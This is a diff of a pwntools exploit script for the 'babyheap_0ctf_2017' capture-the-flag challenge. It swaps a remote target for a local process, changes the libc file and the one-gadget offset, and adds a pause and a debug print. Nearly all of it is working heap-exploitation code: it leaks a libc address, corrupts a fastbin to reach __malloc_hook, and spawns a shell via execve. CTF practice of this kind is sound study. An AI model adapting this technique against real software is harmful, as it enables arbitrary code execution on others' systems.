@@ -3,10 +3,9 @@ from pwn import *
 
 #context.log_level = 'debug'
 
-#p = process(['./babyheap_0ctf_2017'], env={ "LD_PRELOAD":"/home/yeuoly/pwn/libc-2.23.64.so" })
-p = remote('node3.buuoj.cn',25471)
-
-libc = ELF('libc-2.23.64.so')
+p = process('./babyheap_0ctf_2017')
+#p = remote('node3.buuoj.cn',25909)
+libc = ELF('libc-2.23.so')
 
 def alloc(size):
 	p.sendlineafter('Command: ', '1')
@@ -39,6 +38,8 @@ fill(0, b'a' * ( 0x80 + 8 ) + p64(0x120 + 1))
 alloc(0x110)
 fill(1, b'a' * ( 0x80 + 8 ) + p64(0x90 + 1))
 free(2)
+
+pause()
 dump(1)
 p.recv(0x90 + 8)
 malloc_hook_addr = u64(p.recv(8)) - 0x58 - 0x10
@@ -51,7 +52,9 @@ alloc(0x60) #4
 alloc(0x60) #5
 free(5)
 
-execve_bin_sh_addr = libc_base + 0x4526a
+execve_bin_sh_addr = libc_base + 0x4525a
+
+print('[+] execve(/bin/sh, 0, 0) : {}'.format(hex(execve_bin_sh_addr)))
 
 fill(4, b'a' * (0x60 + 8) + p64(0x70 + 1) + p64(malloc_hook_addr - 0x23) + p64(0))
 alloc(0x60) #5
